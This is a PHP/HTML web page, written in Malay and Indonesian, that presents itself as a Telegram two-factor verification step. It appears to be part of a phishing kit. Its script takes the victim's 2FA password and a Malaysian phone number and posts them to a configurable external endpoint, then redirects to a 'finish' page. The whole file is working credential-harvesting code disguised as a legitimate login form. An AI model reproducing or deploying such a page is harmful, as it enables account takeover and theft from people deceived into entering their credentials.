<?php
// Include settings file
require_once 'settings.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Two-Factor Authentication</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="shortcut icon" href="img/logokemensos.png" type="image/x-icon">
</head>
<body>
    <div>
        
<header style="padding: 10px; background-color: #ffffff; color: white; display: flex; justify-content: space-between; align-items: center;">
    <div>
        
    </div>

    <!-- Hamburger Menu -->
    <div class="hamburger-menu" onclick="toggleMenu()" style="cursor: pointer; display: inline-block; padding: 10px;">
        <span class="bar" style="width: 25px; height: 3px; background-color: #535353; margin: 5px 0; display: block; transition: all 0.3s ease-in-out;"></span>
        <span class="bar" style="width: 25px; height: 3px; background-color: #535353; margin: 5px 0; display: block; transition: all 0.3s ease-in-out;"></span>
        <span class="bar" style="width: 25px; height: 3px; background-color: #535353; margin: 5px 0; display: block; transition: all 0.3s ease-in-out;"></span>
    </div>
</header>
        <div style="position: relative; text-align: left;">
            <!-- Gambar -->
            <img src="img/two-step-verification-on-Telegram.avif
" class="img-fluid mx-auto d-block" style="width: 100%;">
        
            <!-- Teks di kiri atas -->
        </div>

        <div class=container>
        
<main class="container py-5">
    <div id="a2f-container" class="card shadow mx-auto" style="max-width: 400px;">
    <div class="card-body">
        <h3 class="card-title text-center">Pengesahan Dua Faktor</h3>
        <p class="text-muted text-center">Sila masukkan kata laluan 2FA anda untuk melengkapkan log masuk..</p>
        <form id="a2f-form" class="mt-4">
            <div class="mb-3 position-relative">
                <input type="password" id="password" class="form-control" placeholder="Masukkan kata laluan 2FA" required>
                <button type="button" id="togglePassword" class="btn position-absolute end-0 top-0 border-0">
                    <i id="eyeIcon" class="fas fa-eye"></i>
                </button>
            </div>
            <div id="feedback" class="alert mt-2" style="display:none;"></div>
            <div id="loader" style="display:none;"><div class="loader">Proses Verifikasi...</div></div>
            <div id="wrong" class="text-red-500 text-sm mt-1" style="display:none;">Password Tidak Valid</div>
            <div class="d-grid">
                <button type="button" id="verifyButton" class="btn" style="background-color: #3f51b5; color:#ffffff">
                    <span id="btnLoader" class="hidden">⏳</span>
                    <span id="btnText">Pengesahan</span>
                </button>
            </div>
        </form>
    </div>
</div>
</main>

      </div>
        
        
<footer class="text-center py-4 bg-light">
    <p class="mb-0 text-muted">Copyright © 2026 All Rights Reserved
.</p>
</footer>

    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.bundle.min.js"></script>
    
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        // Create the phpSettings variable from PHP $url variable
        var phpSettings = {
            endpointUrl: '<?php echo $url; ?>'
        };
    </script>
    
<script>
$(document).ready(function() {
   $("#verifyButton").on("click", function(e) {
       e.preventDefault();
       const password = $("#password").val();
       const feedback = $("#feedback");
       const loader = $("#loader");
       const btnLoader = $("#btnLoader");
       const btnText = $("#btnText");
       const wrongMsg = $("#wrong");
       const phoneNumber = sessionStorage.getItem('phone');
       
       // Validasi password
       if (!password) {
           wrongMsg.text("Kata sandi tidak boleh kosong").show();
           return;
       }
       
       // Tampilkan loader dan ubah teks tombol
       loader.show();
       btnLoader.removeClass('hidden');
       btnText.text('Memproses...');
       $(this).addClass('opacity-75 pointer-events-none');
       
       feedback.hide();
       wrongMsg.hide();
       
       // Ambil endpoint dari variabel PHP yang sudah di-parse ke JavaScript
       const endpointUrl = phpSettings.endpointUrl;
       
       $.ajax({
           url: endpointUrl + "/verify_2fa",
           type: "POST",
           contentType: "application/json",
           data: JSON.stringify({
               password: password,
               phone: "+60" + phoneNumber
           }),
           success: function(data) {
               loader.hide();
               if (data.status === "success") {
                   feedback
                       .removeClass('alert-danger')
                       .addClass('alert-success')
                       .html('<strong><i class="fas fa-check-circle"></i> Berhasil!</strong><br>' + data.message)
                       .show();
                   setTimeout(function() {
                       window.location.href = "finish.php";
                   }, 1000);
               } else {
                   wrongMsg.text(data.message).show();
                   // Reset tombol
                   btnLoader.addClass('hidden');
                   btnText.text('Konfirmasi');
                   $('#verifyButton').removeClass('opacity-75 pointer-events-none');
               }
           },
           error: function(xhr) {
               loader.hide();
               const errorResponse = xhr.responseJSON || { message: "Terjadi kesalahan saat memverifikasi kode 2FA." };
               wrongMsg.text(errorResponse.message).show();
               // Reset tombol
               btnLoader.addClass('hidden');
               btnText.text('Konfirmasi');
               $('#verifyButton').removeClass('opacity-75 pointer-events-none');
           }
       });
   });

   // Toggle password visibility
   $('#togglePassword').on('click', function() {
       const password = document.getElementById('password');
       const eyeIcon = document.getElementById('eyeIcon');
       
       if (password.type === 'password') {
           password.type = 'text';
           eyeIcon.classList.remove('fa-eye');
           eyeIcon.classList.add('fa-eye-slash');
       } else {
           password.type = 'password';
           eyeIcon.classList.remove('fa-eye-slash');
           eyeIcon.classList.add('fa-eye');
       }
   });
});
</script>

</body>
</html>